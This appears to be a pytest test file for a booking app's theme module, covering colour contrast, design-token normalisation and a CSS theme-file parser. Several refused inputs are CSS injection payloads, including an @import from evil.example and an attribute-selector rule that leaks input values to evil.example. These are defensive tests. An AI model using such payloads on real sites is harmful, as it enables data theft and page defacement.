"""Design tokens, cross-token contrast and the theme file (ADR 0041)."""

import pytest

from app.domain.errors import DomainError, ErrorCode
from app.domain.theme import (
    MAX_THEME_FILE_BYTES,
    TOKENS,
    Theme,
    ThemeFileError,
    contrast,
    normalise,
    parse_theme_file,
    theme_file_text,
)

ACCENT = "#01689B"


def _field(error: pytest.ExceptionInfo[DomainError]) -> str | None:
    assert error.value.code is ErrorCode.INVALID_CONFIGURATION
    return error.value.field


def _line(data: str) -> int:
    with pytest.raises(ThemeFileError) as error:
        parse_theme_file(data.encode())
    assert error.value.field == "theme_file"
    return error.value.line


def test_contrast_is_symmetric_and_follows_wcag() -> None:
    assert contrast("#000000", "#FFFFFF") == pytest.approx(21.0)
    assert contrast("#FFFFFF", "#767676") == pytest.approx(contrast("#767676", "#FFFFFF"))


@pytest.mark.parametrize(
    ("name", "value", "expected"),
    [
        ("color-text", "#0b0c0c", "#0B0C0C"),
        ("font-size", "18px", "18px"),
        ("font-size", "1.125rem", "1.125rem"),
        ("radius", "0px", "0px"),
        ("max-width", "75rem", "75rem"),
        ("line-height", "1.50", "1.5"),
        ("font-weight-heading", "600", "600"),
        ("shadow", "none", "none"),
        ("font-family", 'Fira Sans,  "Segoe UI", sans-serif', 'Fira Sans, "Segoe UI", sans-serif'),
        ("font-family-heading", "-apple-system, system-ui", "-apple-system, system-ui"),
    ],
)
def test_valid_values_are_normalised(name: str, value: str, expected: str) -> None:
    assert normalise(name, value) == expected


@pytest.mark.parametrize(
    ("name", "value"),
    [
        ("color-text", "black"),
        ("color-text", "#000;}"),
        ("font-size", "12px"),  # below 16 px: text never smaller than the browser default
        ("font-size", "2rem"),
        ("font-size", "17pt"),
        ("radius", "-1px"),
        ("max-width", "100vw"),
        ("line-height", "1.2"),
        ("font-weight-heading", "650"),
        ("font-weight-heading", "bold"),
        ("shadow", "0 0 9999px red"),
        ("font-family", 'url("https://evil.example/f.woff2")'),
        ("font-family", "Arial; } body { display: none"),
        ("font-family", "Arial !important"),
        ("font-family", ", ".join(["A"] * 9)),
        ("space-m", "1rem"),  # spacing is not editable
        ("target", "10px"),  # target size is not editable (WCAG 2.5.8)
        ("color-focus", "#FFFFFF"),  # focus colours are fixed
    ],
)
def test_invalid_values_and_tokens_are_refused_with_their_field(name: str, value: str) -> None:
    with pytest.raises(DomainError) as error:
        normalise(name, value)
    assert _field(error) == name.replace("-", "_")


def test_the_default_theme_passes_every_contrast_rule() -> None:
    assert Theme().contrast_failure(ACCENT, ACCENT) is None


def test_every_default_is_a_valid_value_of_its_token() -> None:
    for spec in TOKENS:
        if spec.name != "shadow":
            assert normalise(spec.name, spec.default) == spec.default


@pytest.mark.parametrize(
    ("values", "accent", "blamed"),
    [
        ({"color-text": "#999999"}, ACCENT, "color_text"),
        ({"color-page": "#333333"}, ACCENT, "color_page"),  # text on the page is unreadable
        ({"color-surface": "#5A5A5A"}, ACCENT, "color_surface"),
        ({"color-on-accent": "#000000"}, ACCENT, "color_on_accent"),
        ({"color-border-strong": "#D0D0D0"}, ACCENT, "color_border_strong"),
        ({"color-page": "#E8E8E8"}, "#2B78A8", "accent_color"),  # both changed: foreground
    ],
)
def test_contrast_rules_blame_the_changed_colour(
    values: dict[str, str], accent: str, blamed: str
) -> None:
    assert Theme.of(values).contrast_failure(accent, ACCENT) == blamed


def test_a_yellow_accent_with_dark_text_on_it_still_needs_link_contrast() -> None:
    theme = Theme.of({"color-on-accent": "#000000"})
    assert theme.contrast_failure("#FFBF47", ACCENT) == "accent_color"


def test_a_theme_resolves_defaults_and_overrides() -> None:
    theme = Theme.of({"radius": "0px"})
    assert theme.resolved("radius") == "0px"
    assert theme.resolved("radius-small") == "6px"
    assert theme.resolved("color-error") == "#C22A1E"
    assert theme.get("radius-small") is None


def test_a_theme_file_with_root_and_comments_is_read() -> None:
    parsed = parse_theme_file(
        b"/* Gemeente Voorbeeld */\n"
        b":root {\n"
        b"  --booking-color-accent: #154273;\n"
        b"  --booking-radius: 0px; /* square */\n"
        b'  --booking-font-family: "Fira Sans", sans-serif\n'
        b"}\n"
    )
    assert parsed.accent == "#154273"
    assert parsed.theme == Theme.of({"radius": "0px", "font-family": '"Fira Sans", sans-serif'})


def test_a_theme_file_without_wrapper_or_accent_is_read() -> None:
    parsed = parse_theme_file(b"--booking-line-height: 1.8;")
    assert parsed.accent is None
    assert parsed.theme.get("line-height") == "1.8"


@pytest.mark.parametrize(
    ("text", "line"),
    [
        (":root {\n  --booking-radius: 0px;\n}\nbody { display: none; }\n", 4),
        (":root {\n  --booking-radius: 0px;\n  color: red;\n}", 3),
        (":root {\n  --booking-space-m: 0;\n}", 2),
        (":root {\n  --booking-color-text: #000 !important;\n}", 2),
        ('@import url("https://evil.example/x.css");\n--booking-radius: 0px;', 1),
        (":root {\n\n  --booking-radius: url(x);\n}", 3),
        ("input[value^='a'] { background: url(https://evil.example/a) }", 1),
        (":root {\n  --booking-radius: 0px;\n", 2),  # wrapper not closed
        ("/* never closed\n--booking-radius: 0px;", 1),
        (":root {\n  --booking-color-accent: red;\n}", 2),
    ],
)
def test_anything_but_allowed_declarations_is_refused_with_its_line(text: str, line: int) -> None:
    assert _line(text) == line


@pytest.mark.parametrize(
    "data",
    [b"", b"   \n", b"\xff\xfe--booking-radius: 0px;", b"--booking-radius: 0px;" * 400],
)
def test_empty_oversized_or_non_utf8_files_are_refused_as_a_whole(data: bytes) -> None:
    assert len(b"--booking-radius: 0px;" * 400) > MAX_THEME_FILE_BYTES
    with pytest.raises(ThemeFileError) as error:
        parse_theme_file(data)
    assert error.value.line == 0


def test_the_downloaded_file_reads_back_as_the_same_theme() -> None:
    theme = Theme.of({"color-text": "#0B0C0C", "radius": "0px", "shadow": "none"})
    text = theme_file_text("#154273", theme)

    parsed = parse_theme_file(text.encode())

    assert "  --booking-radius: 0px;" in text
    assert "  /* --booking-radius-small: 6px; */" in text
    assert parsed.accent == "#154273"
    assert parsed.theme == theme
